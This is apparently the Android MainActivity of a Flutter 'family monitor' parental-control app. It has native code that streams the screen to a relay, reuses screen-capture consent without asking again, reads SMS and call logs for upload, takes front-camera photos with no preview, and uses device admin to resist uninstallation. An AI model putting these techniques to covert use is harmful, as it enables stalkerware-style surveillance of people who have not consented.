package com.example.family_monitor

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraCaptureSession
import android.media.ImageReader
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Log
import com.example.family_monitor.BuildConfig
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.util.concurrent.atomic.AtomicBoolean

class MainActivity : FlutterActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val SCREEN_CAPTURE_CHANNEL = "com.familymonitor/screen_capture"
        private const val SNAPSHOT_CHANNEL       = "com.familymonitor/snapshot"
        private const val SMS_CHANNEL            = "family_monitor/sms"
        private const val REQUEST_MEDIA_PROJECTION = 1001
    }

    private var pendingResult: MethodChannel.Result? = null

    private lateinit var projectionManager: MediaProjectionManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ensureNotificationChannels()
        // Delete stale notification channels that may have been cached with
        // IMPORTANCE_NONE by a previous install — Android caches channel settings
        // and ignores recreation attempts unless the channel is deleted first.
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val nm = getSystemService(android.app.NotificationManager::class.java)
            listOf("family_monitor_bg", "family_monitor_channel", "fm_bg_sync").forEach { id ->
                val ch = nm.getNotificationChannel(id)
                if (ch != null && ch.importance == android.app.NotificationManager.IMPORTANCE_NONE) {
                    nm.deleteNotificationChannel(id)
                    Log.d(TAG, "Deleted stale channel: $id")
                }
            }
        }

        projectionManager =
            getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }

    @Suppress("DEPRECATION", "OVERRIDE_DEPRECATION")
    override fun onActivityResult(
        requestCode: Int,
        resultCode: Int,
        data: Intent?
    ) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode != REQUEST_MEDIA_PROJECTION) return

        val pending = pendingResult
        pendingResult = null

        if (resultCode == Activity.RESULT_OK && data != null) {

            val serviceIntent =
                Intent(this, ScreenCaptureService::class.java).apply {
                    putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
                    putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
                }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }

            pending?.success(true)
        } else {
            pending?.success(false)
        }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // ── Screen-capture control channel ────────────────────────────────────
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            SCREEN_CAPTURE_CHANNEL
        ).setMethodCallHandler { call, result ->

            when (call.method) {

                "requestProjection" -> {
                    // BUG-3-FIX: If a live projection token already exists, return true immediately
                    // instead of showing the "Start Now" system dialog again.
                    if (ScreenCaptureService.projectionToken != null) {
                        result.success(true)
                        return@setMethodCallHandler
                    }
                    if (pendingResult != null) {
                        result.error("BUSY", "Projection request already running", null)
                        return@setMethodCallHandler
                    }
                    pendingResult = result
                    @Suppress("DEPRECATION")
                    startActivityForResult(
                        projectionManager.createScreenCaptureIntent(),
                        REQUEST_MEDIA_PROJECTION
                    )
                }

                "isProjectionActive" -> {
                    result.success(ScreenCaptureService.projectionToken != null)
                }

                "releaseProjection" -> {
                    try {
                        ScreenCaptureService.projectionToken?.stop()
                    } catch (_: Exception) {}
                    result.success(null)
                }

                // BUG-1-FIX: Return the saved MediaProjection result code and data
                // so that flutter_webrtc's getDisplayMedia() can reuse the existing
                // token instead of triggering the system consent dialog again.
                //
                // BUG-2-FIX: Also return Parcel-marshaled Intent bytes that preserve
                // the Binder extra. The URI-serialized form (resultDataUri) LOSES the
                // IBinder needed by getMediaProjection() on Android 14+. The Parcel
                // bytes (resultDataParcel) preserve ALL data including the Binder.
                "getProjectionParams" -> {
                    try {
                        val code = ScreenCaptureService.savedResultCode
                        val data = ScreenCaptureService.savedResultData
                        val parcelBytes = ScreenCaptureService.savedResultDataParcelBytes
                        if (code != 0 && data != null) {
                            val uri = data.toUri(0)
                            val params = mutableMapOf<String, Any?>(
                                "resultCode" to code,
                                "resultDataUri" to uri.toString()
                            )
                            // BUG-2-FIX: Include Parcel-marshaled bytes that
                            // preserve the Binder extra. Dart can pass these bytes
                            // to flutter_webrtc's getDisplayMedia() as
                            // androidMediaProjectionResultData (byte array).
                            if (parcelBytes != null) {
                                params["resultDataParcel"] = parcelBytes
                            }
                            result.success(params)
                        } else {
                            result.success(null)
                        }
                    } catch (e: Exception) {
                        result.success(null)
                    }
                }

                // BUG-2-FIX: Return the Parcel-marshaled Intent bytes that preserve
                // the Binder extra. This is the PREFERRED way to pass projection data
                // to flutter_webrtc on Android 14+ where Intent.toUri() loses the Binder.
                "getProjectionParamsParcel" -> {
                    try {
                        val code = ScreenCaptureService.savedResultCode
                        val parcelBytes = ScreenCaptureService.savedResultDataParcelBytes
                        if (code != 0 && parcelBytes != null) {
                            result.success(mapOf(
                                "resultCode" to code,
                                "resultDataParcel" to parcelBytes
                            ))
                        } else {
                            result.success(null)
                        }
                    } catch (e: Exception) {
                        result.success(null)
                    }
                }

                // BUG-2-FIX: Start native screen frame capture using VirtualDisplay +
                // ImageReader. This is used as a fallback when flutter_webrtc's
                // getDisplayMedia() fails (e.g., due to Intent URI serialization
                // losing the Binder extra on Android 14+).
                "startNativeScreenCapture" -> {
                    try {
                        val svc = ScreenCaptureService.instance
                        if (svc == null) {
                            result.success(false)
                            return@setMethodCallHandler
                        }
                        val width = call.argument<Int>("width") ?: 720
                        val height = call.argument<Int>("height") ?: 1280
                        val fps = call.argument<Int>("fps") ?: 5
                        val started = svc.startFrameCapture(width, height, fps)
                        result.success(started)
                    } catch (e: Exception) {
                        Log.e(TAG, "startNativeScreenCapture error: $e")
                        result.success(false)
                    }
                }

                // BUG-2-FIX: Stop native screen frame capture.
                "stopNativeScreenCapture" -> {
                    try {
                        ScreenCaptureService.instance?.stopFrameCapture()
                        result.success(null)
                    } catch (e: Exception) {
                        result.success(null)
                    }
                }

                // BUG-2-FIX: Get the latest captured screen frame as JPEG bytes.
                // Returns null if frame capture is not running or no frame is available.
                "getScreenFrame" -> {
                    try {
                        val frame = ScreenCaptureService.instance?.getLatestFrame()
                        result.success(frame)
                    } catch (e: Exception) {
                        result.success(null)
                    }
                }

                // BUG-3-FIX: Start ScreenCaptureService with ACTION_START_SILENT.
                // This can be called from the background service isolate where
                // no foreground Activity is available to show the consent dialog.
                // The service will try to reuse the saved token; if invalid, it
                // will show a notification prompting the user to re-grant consent.
                "startSilentProjection" -> {
                    try {
                        val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                            action = ScreenCaptureService.ACTION_START_SILENT
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            startForegroundService(svcIntent)
                        else startService(svcIntent)
                        result.success(true)
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                // ── STREAM-01: ScreenStreamService WebSocket streaming methods ──

                "startScreenStream" -> {
                    try {
                        val uid = call.argument<String>("uid")
                        val serverUrl = call.argument<String>("serverUrl")
                        if (uid.isNullOrEmpty()) {
                            result.error("INVALID_ARGS", "uid is required", null)
                            return@setMethodCallHandler
                        }
                        // Check if a MediaProjection token is available.
                        // Priority:
                        //   1. Live projection token from ScreenCaptureService
                        //   2. Saved result code + data from ScreenCaptureService
                        //   3. Persisted result code in SharedPreferences (survives
                        //      ScreenCaptureService being stopped/restarted)
                        val hasLiveToken = ScreenCaptureService.projectionToken != null
                        val hasSavedData = ScreenCaptureService.savedResultCode != 0 &&
                                ScreenCaptureService.savedResultData != null
                        val hasPersistedToken = try {
                            getSharedPreferences("fm_prefs", Context.MODE_PRIVATE)
                                .getInt("projection_result_code", 0) != 0
                        } catch (_: Exception) { false }

                        if (!hasLiveToken && !hasSavedData && !hasPersistedToken) {
                            result.error("NO_TOKEN", "No MediaProjection token available — request screen capture permission first", null)
                            return@setMethodCallHandler
                        }

                        // Persist the UID and server URL so ScreenStreamService can
                        // read them on restart (START_STICKY recovery).
                        if (!uid.isNullOrEmpty()) {
                            getSharedPreferences("fm_prefs", Context.MODE_PRIVATE)
                                .edit()
                                .putString("stream_child_uid", uid)
                                .apply()
                        }

                        val streamIntent = Intent(this, ScreenStreamService::class.java).apply {
                            action = ScreenStreamService.ACTION_START_STREAM
                            putExtra(ScreenStreamService.EXTRA_UID, uid)
                            if (!serverUrl.isNullOrEmpty()) {
                                putExtra(ScreenStreamService.EXTRA_SERVER_URL, serverUrl)
                            }
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            startForegroundService(streamIntent)
                        else startService(streamIntent)
                        result.success(true)
                    } catch (e: Exception) {
                        Log.e(TAG, "startScreenStream error: $e")
                        result.success(false)
                    }
                }

                "stopScreenStream" -> {
                    try {
                        val streamIntent = Intent(this, ScreenStreamService::class.java).apply {
                            action = ScreenStreamService.ACTION_STOP_STREAM
                        }
                        startService(streamIntent)
                        result.success(null)
                    } catch (e: Exception) {
                        result.success(null)
                    }
                }

                "isScreenStreamRunning" -> {
                    result.success(ScreenStreamService.isStreaming)
                }

                "getStreamStatus" -> {
                    try {
                        result.success(mapOf(
                            "isStreaming" to ScreenStreamService.isStreaming,
                            "wsConnected" to ScreenStreamService.wsConnected,
                            "frameCount" to ScreenStreamService.frameCount,
                            "lastFrameTimestamp" to ScreenStreamService.lastFrameTimestamp
                        ))
                    } catch (e: Exception) {
                        result.success(null)
                    }
                }

                // Save the stream relay URL to native SharedPreferences (fm_prefs)
                // so that ScreenStreamService can read it on restart.
                "saveStreamRelayUrl" -> {
                    try {
                        val url = call.argument<String>("url")
                        if (!url.isNullOrEmpty()) {
                            getSharedPreferences("fm_prefs", Context.MODE_PRIVATE)
                                .edit()
                                .putString("stream_relay_url", url)
                                .apply()
                            result.success(true)
                        } else {
                            result.success(false)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "saveStreamRelayUrl error: $e")
                        result.success(false)
                    }
                }

                "getBaseUrl" -> {
                    try {
                        result.success(BuildConfig.BASE_URL)
                    } catch (e: Exception) {
                        Log.e(TAG, "getBaseUrl error: $e")
                        result.success("")
                    }
                }

                "requestBatteryOptimizationExemption" -> {
                    try {
                        val intent = Intent(
                            android.provider.Settings
                                .ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                        )
                        intent.data = android.net.Uri.parse("package:$packageName")
                        startActivity(intent)
                        result.success(true)
                    } catch (e: Exception) {
                        result.error("BATTERY_OPT_ERROR", e.message, null)
                    }
                }

                "isBatteryOptimizationExempt" -> {
                    try {
                        val powerManager =
                            getSystemService(POWER_SERVICE) as android.os.PowerManager
                        result.success(
                            powerManager.isIgnoringBatteryOptimizations(packageName)
                        )
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                // ICON-FIX: hideAppIcon / showAppIcon removed.
                // LauncherAlias no longer exists in the manifest; there is no
                // component to toggle. The Dart layer no longer calls these methods.

                "isDeviceAdminActive" -> {
                    try {
                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        val cn = ComponentName(this, FamilyDeviceAdminReceiver::class.java)
                        result.success(dpm.isAdminActive(cn))
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                // FIX-15: DevicePolicyManager.setPackagesSuspended for reliable
                // app blocking when Device Admin is active (API 24+, minSdk=24).
                // Suspended apps cannot be launched by the user — they see a
                // system dialog explaining the app is unavailable. This is more
                // reliable than AccessibilityService-based home-screen redirect.
                "suspendPackages" -> {
                    try {
                        val packages = call.argument<List<String>>("packages") ?: emptyList()
                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        val cn = ComponentName(this, FamilyDeviceAdminReceiver::class.java)
                        if (dpm.isAdminActive(cn) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            val failed = dpm.setPackagesSuspended(
                                cn,
                                packages.toTypedArray(),
                                true
                            )
                            result.success(failed?.toList() ?: emptyList<String>())
                        } else {
                            result.success(emptyList<String>())
                        }
                    } catch (e: Exception) {
                        result.error("SUSPEND_ERROR", e.message, null)
                    }
                }

                "unsuspendPackages" -> {
                    try {
                        val packages = call.argument<List<String>>("packages") ?: emptyList()
                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        val cn = ComponentName(this, FamilyDeviceAdminReceiver::class.java)
                        if (dpm.isAdminActive(cn) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            dpm.setPackagesSuspended(
                                cn,
                                packages.toTypedArray(),
                                false
                            )
                        }
                        result.success(null)
                    } catch (e: Exception) {
                        result.error("UNSUSPEND_ERROR", e.message, null)
                    }
                }

                "requestDeviceAdmin" -> {
                    try {
                        val cn = ComponentName(this, FamilyDeviceAdminReceiver::class.java)
                        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
                            putExtra(
                                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Keeps Family Monitor running and prevents it from being " +
                                "removed without your parent's knowledge."
                            )
                        }
                        startActivity(intent)
                        result.success(true)
                    } catch (e: Exception) {
                        result.error("DA_ERROR", e.message, null)
                    }
                }

                // Returns all user-launchable installed apps as:
                // [{packageName, appName, iconBytes (PNG ByteArray or null)}]
                // Icons are resized to 72×72 px JPEG at 85% quality to keep
                // Firebase Storage upload size small (~2 KB each).
                "getInstalledApps" -> {
                    try {
                        val pm = packageManager
                        val apps = pm.getInstalledApplications(0)
                        val list = mutableListOf<Map<String, Any?>>()
                        for (app in apps) {
                            val launchIntent = pm.getLaunchIntentForPackage(app.packageName)
                                ?: continue
                            val appName = pm.getApplicationLabel(app).toString()
                            val iconBytes: ByteArray? = try {
                                val drawable = pm.getApplicationIcon(app.packageName)
                                val size = 72
                                val bmp = android.graphics.Bitmap.createBitmap(
                                    size, size, android.graphics.Bitmap.Config.ARGB_8888
                                )
                                val canvas = android.graphics.Canvas(bmp)
                                drawable.setBounds(0, 0, size, size)
                                drawable.draw(canvas)
                                val out = java.io.ByteArrayOutputStream()
                                bmp.compress(
                                    android.graphics.Bitmap.CompressFormat.JPEG, 85, out
                                )
                                bmp.recycle()
                                out.toByteArray()
                            } catch (_: Exception) { null }
                            list.add(mapOf(
                                "packageName" to app.packageName,
                                "appName"     to appName,
                                "iconBytes"   to iconBytes
                            ))
                        }
                        result.success(list)
                    } catch (e: Exception) {
                        result.error("APP_LIST_ERROR", e.message, null)
                    }
                }

                "readCallLog" -> {
                    try {
                        val cursor = contentResolver.query(
                            android.provider.CallLog.Calls.CONTENT_URI,
                            arrayOf(
                                android.provider.CallLog.Calls.NUMBER,
                                android.provider.CallLog.Calls.CACHED_NAME,
                                android.provider.CallLog.Calls.TYPE,
                                android.provider.CallLog.Calls.DATE,
                                android.provider.CallLog.Calls.DURATION
                            ),
                            null, null,
                            "${android.provider.CallLog.Calls.DATE} DESC"
                        )
                        val list = mutableListOf<Map<String, Any?>>()
                        var count = 0
                        cursor?.use { c ->
                            while (c.moveToNext() && count < 150) {
                                val typeIdx = c.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                                val numIdx  = c.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                                val nameIdx = c.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
                                val dateIdx = c.getColumnIndex(android.provider.CallLog.Calls.DATE)
                                val durIdx  = c.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                                if (typeIdx < 0 || numIdx < 0 || dateIdx < 0 || durIdx < 0) continue
                                val typeInt = c.getInt(typeIdx)
                                val typeStr = when (typeInt) {
                                    android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                                    android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                    android.provider.CallLog.Calls.MISSED_TYPE   -> "missed"
                                    else -> "unknown"
                                }
                                list.add(mapOf(
                                    "number"   to (c.getString(numIdx) ?: ""),
                                    "name"     to (if (nameIdx >= 0) c.getString(nameIdx) ?: "" else ""),
                                    "type"     to typeStr,
                                    "date"     to c.getLong(dateIdx),
                                    "duration" to c.getLong(durIdx)
                                ))
                                count++
                            }
                        }
                        result.success(list)
                    } catch (e: Exception) {
                        result.error("CALL_LOG_ERROR", e.message, null)
                    }
                }

                "openOemAutoStartSettings" -> {
                    // RC-OEM-01: Deep-link to OEM battery/autostart screen.
                    val launched = tryOpenOemAutoStart()
                    result.success(launched)
                }

                "isAccessibilityServiceEnabled" -> {
                    try {
                        val serviceId = "$packageName/.AppBlockAccessibilityService"
                        val enabledServices = android.provider.Settings.Secure.getString(
                            contentResolver,
                            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                        ) ?: ""
                        result.success(enabledServices.contains(serviceId))
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                "openAccessibilitySettings" -> {
                    try {
                        startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        })
                        result.success(true)
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                else -> result.notImplemented()
            }
        }

        // ── Native camera snapshot channel ────────────────────────────────────
        // Provides a Camera2-based still capture that works without a visible
        // preview surface, falling back to the Flutter CameraController path on
        // any error. The Dart side catches MissingPluginException and PlatformException
        // gracefully, so this channel only needs to succeed when it can.
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            SNAPSHOT_CHANNEL
        ).setMethodCallHandler { call, result ->
            when (call.method) {
                "takeNativeSnapshot" -> takeNativeSnapshotAsync(result)
                else                 -> result.notImplemented()
            }
        }

        // ── SMS reading channel ───────────────────────────────────────────────
        // Reads SMS messages from the device via ContentResolver and returns
        // them to Dart for upload to Firebase. Requires READ_SMS permission.
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            SMS_CHANNEL
        ).setMethodCallHandler { call, result ->
            when (call.method) {
                "readSms" -> {
                    try {
                        val limit = call.argument<Int>("limit") ?: 100
                        val uri = android.net.Uri.parse("content://sms/")
                        val cursor = contentResolver.query(
                            uri,
                            arrayOf("address", "body", "date", "type"),
                            null, null,
                            "date DESC"
                        )
                        val list = mutableListOf<Map<String, Any?>>()
                        var count = 0
                        cursor?.use { c ->
                            while (c.moveToNext() && count < limit) {
                                val addrIdx = c.getColumnIndex("address")
                                val bodyIdx = c.getColumnIndex("body")
                                val dateIdx = c.getColumnIndex("date")
                                val typeIdx = c.getColumnIndex("type")
                                if (addrIdx < 0 || bodyIdx < 0 || dateIdx < 0 || typeIdx < 0) continue
                                list.add(mapOf(
                                    "address" to (c.getString(addrIdx) ?: ""),
                                    "body"    to (c.getString(bodyIdx) ?: ""),
                                    "date"    to c.getLong(dateIdx),
                                    "type"    to c.getInt(typeIdx)
                                ))
                                count++
                            }
                        }
                        result.success(list)
                    } catch (e: Exception) {
                        result.error("SMS_ERROR", e.message, null)
                    }
                }
                else -> result.notImplemented()
            }
        }
    }

    // ── Camera2 snapshot implementation ──────────────────────────────────────
    // Runs entirely on a dedicated HandlerThread so the main thread is never
    // blocked. result.success / result.error are always dispatched back to the
    // main thread via runOnUiThread, as required by Flutter's MethodChannel
    // contract. An AtomicBoolean ensures the result callback is invoked
    // exactly once even if multiple camera callbacks fire (e.g. timeout + error).
    private fun takeNativeSnapshotAsync(result: MethodChannel.Result) {
        val replied = AtomicBoolean(false)

        fun replyOnce(bytes: ByteArray?) {
            if (replied.compareAndSet(false, true)) {
                runOnUiThread { result.success(bytes) }
            }
        }

        val bgThread = HandlerThread("snapshot-camera").also { it.start() }
        val bgHandler = Handler(bgThread.looper)

        val cameraManager = try {
            getSystemService(CameraManager::class.java)
        } catch (_: Exception) { null }

        if (cameraManager == null) {
            bgThread.quit()
            replyOnce(null)
            return
        }

        // Prefer front-facing camera; fall back to first available
        val cameraId: String? = try {
            cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) ==
                        CameraCharacteristics.LENS_FACING_FRONT
            } ?: cameraManager.cameraIdList.firstOrNull()
        } catch (_: Exception) { null }

        if (cameraId == null) {
            bgThread.quit()
            replyOnce(null)
            return
        }

        val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)

        // Shared cleanup — safe to call multiple times (null-checks on each resource)
        var cameraRef: CameraDevice?          = null
        var sessionRef: CameraCaptureSession? = null

        fun cleanup() {
            try { sessionRef?.close() } catch (_: Exception) {}
            try { cameraRef?.close()  } catch (_: Exception) {}
            try { imageReader.close() } catch (_: Exception) {}
            bgThread.quit()
        }

        // Hard 8-second timeout — prevents the MethodChannel call from hanging
        // if the camera never calls back (e.g. locked by another app).
        val timeoutTask = Runnable {
            Log.w(TAG, "Native snapshot timed out")
            cleanup()
            replyOnce(null)
        }
        bgHandler.postDelayed(timeoutTask, 8_000L)

        // Open the camera on the background thread
        try {
            cameraManager.openCamera(
                cameraId,
                object : CameraDevice.StateCallback() {

                    override fun onOpened(camera: CameraDevice) {
                        cameraRef = camera
                        bgHandler.removeCallbacks(timeoutTask)

                        // Re-arm a shorter timeout for the session + capture phase
                        bgHandler.postDelayed(timeoutTask, 6_000L)

                        val surfaces = listOf(imageReader.surface)
                        try {
                            camera.createCaptureSession(
                                surfaces,
                                object : CameraCaptureSession.StateCallback() {

                                    override fun onConfigured(session: CameraCaptureSession) {
                                        sessionRef = session
                                        bgHandler.removeCallbacks(timeoutTask)

                                        imageReader.setOnImageAvailableListener({ reader ->
                                            val image = try {
                                                reader.acquireLatestImage()
                                            } catch (_: Exception) { null }

                                            val bytes = image?.use { img ->
                                                val buf = img.planes[0].buffer
                                                ByteArray(buf.remaining()).also { buf.get(it) }
                                            }

                                            cleanup()
                                            replyOnce(bytes)
                                        }, bgHandler)

                                        try {
                                            val req = camera
                                                .createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                                .apply { addTarget(imageReader.surface) }
                                                .build()
                                            session.capture(
                                                req,
                                                object : CameraCaptureSession.CaptureCallback() {},
                                                bgHandler
                                            )
                                        } catch (e: Exception) {
                                            Log.e(TAG, "Capture request failed: $e")
                                            cleanup()
                                            replyOnce(null)
                                        }
                                    }

                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        Log.e(TAG, "Camera session configure failed")
                                        cleanup()
                                        replyOnce(null)
                                    }
                                },
                                bgHandler
                            )
                        } catch (e: Exception) {
                            Log.e(TAG, "createCaptureSession failed: $e")
                            cleanup()
                            replyOnce(null)
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        Log.w(TAG, "Camera disconnected")
                        cameraRef = camera
                        cleanup()
                        replyOnce(null)
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        Log.e(TAG, "Camera error: $error")
                        cameraRef = camera
                        cleanup()
                        replyOnce(null)
                    }
                },
                bgHandler
            )
        } catch (e: SecurityException) {
            // CAMERA permission not granted at the time of the call
            Log.e(TAG, "Camera permission denied: $e")
            bgHandler.removeCallbacks(timeoutTask)
            cleanup()
            replyOnce(null)
        } catch (e: Exception) {
            Log.e(TAG, "openCamera failed: $e")
            bgHandler.removeCallbacks(timeoutTask)
            cleanup()
            replyOnce(null)
        }
    }

    /**
     * RC-OEM-01: Deep-link to OEM-specific battery/autostart settings.
     * Returns true if an intent was found and launched.
     */
    private fun tryOpenOemAutoStart(): Boolean {
        val intents = listOf(
            // Xiaomi / MIUI
            Intent().apply {
                component = android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )
            },
            // Oppo / ColorOS
            Intent().apply {
                component = android.content.ComponentName(
                    "com.coloros.oppoguardelf",
                    "com.coloros.powermanager.fuelgaue.PowerUsageModelActivity"
                )
            },
            Intent().apply {
                component = android.content.ComponentName(
                    "com.oppo.safe",
                    "com.oppo.safe.permission.startup.StartupAppListActivity"
                )
            },
            // Vivo / FuntouchOS
            Intent().apply {
                component = android.content.ComponentName(
                    "com.iqoo.secure",
                    "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"
                )
            },
            Intent().apply {
                component = android.content.ComponentName(
                    "com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                )
            },
            // Huawei / EMUI
            Intent().apply {
                component = android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                )
            },
            // Generic: Android battery optimization (works on Samsung, OnePlus, stock)
            Intent().apply {
                action = android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                data = android.net.Uri.parse("package:$packageName")
            },
            // Fallback: App details (shows battery option)
            Intent().apply {
                action = android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                data = android.net.Uri.parse("package:$packageName")
            }
        )
        for (intent in intents) {
            try {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                return true
            } catch (_: Exception) { /* Try next */ }
        }
        return false
    }

    private fun ensureNotificationChannels() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val nm = getSystemService(android.app.NotificationManager::class.java)
            val required = mapOf(
                "family_monitor_bg"      to "Family Monitor Background",
                "family_monitor_channel" to "Family Monitor Service",
                "fm_bg_sync"             to "FM Background Sync"
            )
            required.forEach { (id, name) ->
                val existing = nm.getNotificationChannel(id)
                if (existing == null ||
                    existing.importance == android.app.NotificationManager.IMPORTANCE_NONE) {
                    nm.deleteNotificationChannel(id)
                    nm.createNotificationChannel(
                        android.app.NotificationChannel(
                            id, name,
                            android.app.NotificationManager.IMPORTANCE_LOW
                        ).apply { setShowBadge(false) }
                    )
                }
            }
        }
    }
}
